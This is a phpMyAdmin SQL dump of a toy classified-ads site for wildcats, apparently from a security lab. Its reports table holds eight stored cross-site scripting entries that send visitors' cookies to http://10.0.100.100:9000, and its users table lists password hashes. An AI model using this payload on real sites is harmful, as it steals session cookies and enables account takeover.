-- phpMyAdmin SQL Dump
-- version 5.0.2
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Apr 16, 2020 at 01:12 PM
-- Server version: 5.7.29-0ubuntu0.18.04.1
-- PHP Version: 7.2.24-0ubuntu0.18.04.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `khanslist`
--

-- --------------------------------------------------------

--
-- Table structure for table `categories`
--

CREATE TABLE `categories` (
  `id` int(255) NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_bin NOT NULL,
  `description` text COLLATE utf8mb4_bin NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

--
-- Dumping data for table `categories`
--

INSERT INTO `categories` (`id`, `name`, `description`) VALUES
(1, 'Tigers', 'The tiger (Panthera tigris) is the largest cat species and a member of the genus Panthera. It is most recognisable for its dark vertical stripes on orange-brown fur with a lighter underside. It is an apex predator, primarily preying on ungulates such as deer and wild boar. It is territorial and generally a solitary but social predator, requiring large contiguous areas of habitat, which support its requirements for prey and rearing of its offspring. Tiger cubs stay with their mother for about two years, before they become independent and leave their mother\'s home range to establish their own.'),
(2, 'Lions', 'The lion (Panthera leo) is a species in the family Felidae; it is a muscular, deep-chested cat with a short, rounded head, a reduced neck and round ears, and a hairy tuft at the end of its tail. It is sexually dimorphic; adult male lions have a prominent mane, which is the most recognisable feature of the species. With a typical head-to-body length of 184–208 cm (72–82 in) they are larger than females at 160–184 cm (63–72 in). It is a social species, forming groups called prides. A lion pride consists of a few adult males, related females and cubs. Groups of female lions usually hunt together, preying mostly on large ungulates. The lion is an apex and keystone predator, although some lions scavenge when opportunities occur, and have been known to hunt humans, although the species typically does not.'),
(3, 'Leopards', 'The leopard (Panthera pardus) is one of the five extant species in the genus Panthera, a member of the Felidae.[4] It occurs in a wide range in sub-Saharan Africa, in small parts of Western and Central Asia, on the Indian subcontinent to Southeast and East Asia. It is listed as Vulnerable on the IUCN Red List because leopard populations are threatened by habitat loss and fragmentation, and are declining in large parts of the global range. In Hong Kong, Singapore, Kuwait, Syria, Libya, Tunisia and most likely in Morocco, leopard populations have already been extirpated.[3] Contemporary records suggest that the leopard occurs in only 25% of its historical global range.[5][6]  Leopards are hunted illegally, and their body parts are smuggled in the wildlife trade for medicinal practices and decoration.'),
(4, 'Others', 'Any other category of WildCat or other things.');

-- --------------------------------------------------------

--
-- Table structure for table `listings`
--

CREATE TABLE `listings` (
  `id` int(255) NOT NULL,
  `userid` int(255) NOT NULL,
  `category` int(255) NOT NULL DEFAULT '4',
  `title` varchar(255) COLLATE utf8mb4_bin NOT NULL,
  `content` text COLLATE utf8mb4_bin NOT NULL,
  `image` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

--
-- Dumping data for table `listings`
--

INSERT INTO `listings` (`id`, `userid`, `category`, `title`, `content`, `image`) VALUES
(1, 2, 1, 'WTS: Baby Tiger', 'I am selling my baby tiger. She\'s ferocious. Gnawed on my leg the other day. I only have two legs so she\'s got to go. Interested buyers only.', 'baby_tiger.jpg'),
(2, 2, 1, 'WTB: baby tiger', 'I\'m looking for a baby tiger. My other one keeps trying to take off my legs. It\'s becoming quite the bother.', 'baby_tiger_2.jpg'),
(5, 1, 2, 'WTB: a new desktop', 'wut is dis???', '5e9614ef798937.81244311.png');

-- --------------------------------------------------------

--
-- Table structure for table `reports`
--

CREATE TABLE `reports` (
  `id` int(255) NOT NULL,
  `userid` int(255) NOT NULL,
  `listing_id` int(255) NOT NULL,
  `report_description` text COLLATE utf8mb4_bin NOT NULL,
  `is_read` int(255) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

--
-- Dumping data for table `reports`
--

INSERT INTO `reports` (`id`, `userid`, `listing_id`, `report_description`, `is_read`) VALUES
(34, 2, 2, '<script>document.write(\'<img src=\"http://10.0.100.100:9000/collect.gif?cookie=\' + document.cookie + \'\" />\');</script> is eevil', 1),
(35, 2, 2, '<script>document.write(\'<img src=\"http://10.0.100.100:9000/collect.gif?cookie=\' + document.cookie + \'\" />\');</script> is eevil', 1),
(36, 2, 2, '<script>document.write(\'<img src=\"http://10.0.100.100:9000/collect.gif?cookie=\' + document.cookie + \'\" />\');</script> is eevil', 1),
(37, 2, 2, '<script>document.write(\'<img src=\"http://10.0.100.100:9000/collect.gif?cookie=\' + document.cookie + \'\" />\');</script> is eevil', 1),
(38, 2, 2, '<script>document.write(\'<img src=\"http://10.0.100.100:9000/collect.gif?cookie=\' + document.cookie + \'\" />\');</script> is eevil', 1),
(39, 2, 2, '<script>document.write(\'<img src=\"http://10.0.100.100:9000/collect.gif?cookie=\' + document.cookie + \'\" />\');</script> is eevil', 1),
(40, 2, 2, '<script>document.write(\'<img src=\"http://10.0.100.100:9000/collect.gif?cookie=\' + document.cookie + \'\" />\');</script> is eevil', 1),
(41, 2, 2, '<script>document.write(\'<img src=\"http://10.0.100.100:9000/collect.gif?cookie=\' + document.cookie + \'\" />\');</script> is eevil', 1);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(255) NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_bin NOT NULL,
  `password` varchar(255) COLLATE utf8mb4_bin NOT NULL,
  `admin` int(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `email`, `password`, `admin`) VALUES
(1, 'admin@local.local', '$2b$12$/3Zblz2ukeK4yOshlQhDHOr8rcuhTvS/2ej3Nh2U8dOTnW/eMU4Se', 1),
(2, 'bob@aol.com', '$2y$10$yBtSeF5w0h1gzGTDxLbDAedN/m4m1V7DL6JXB6mcNPEMapyytFXfC', 0),
(3, 'bob@aol.coms', '$2y$10$5ex/lx.CmwzgY3Ff6dZn1ODOXvVJqjL.sJEhhklGhz2DW8q7BeJIm', 0);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `categories`
--
ALTER TABLE `categories`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `listings`
--
ALTER TABLE `listings`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `reports`
--
ALTER TABLE `reports`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `categories`
--
ALTER TABLE `categories`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `listings`
--
ALTER TABLE `listings`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT for table `reports`
--
ALTER TABLE `reports`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=42;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
